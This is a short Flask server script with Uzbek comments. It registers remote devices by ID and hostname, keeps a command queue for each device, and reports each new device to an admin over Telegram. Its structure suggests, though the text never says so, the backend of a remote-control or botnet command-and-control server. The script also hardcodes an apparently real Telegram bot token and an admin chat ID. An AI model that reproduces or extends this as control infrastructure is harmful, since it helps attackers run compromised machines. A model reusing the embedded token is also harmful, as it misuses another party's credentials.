from flask import Flask, request, jsonify
from telegram import Bot
import datetime

app = Flask(__name__)

# Telegram sozlamalari (hardcode qilingan)
BOT_TOKEN = "7754620943:AAGDtVt1o2SAZNvKtrNoJ725tW1htQBsflw"
ADMIN_CHAT_ID = 1612270615
bot = Bot(BOT_TOKEN)

devices = {}
commands = {}
selected_device = None

@app.route("/hello")
def hello():
    return "Hello World"

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    deviceId = data["deviceId"]
    hostname = data["hostname"]

    devices[deviceId] = {"hostname": hostname, "lastSeen": datetime.datetime.now()}
    if deviceId not in commands:
        commands[deviceId] = []

    # Telegramga xabar yuborish
    bot.send_message(ADMIN_CHAT_ID, f"✅ Device qo'shildi: {hostname} ({deviceId})")

    return jsonify({"status": "ok"})
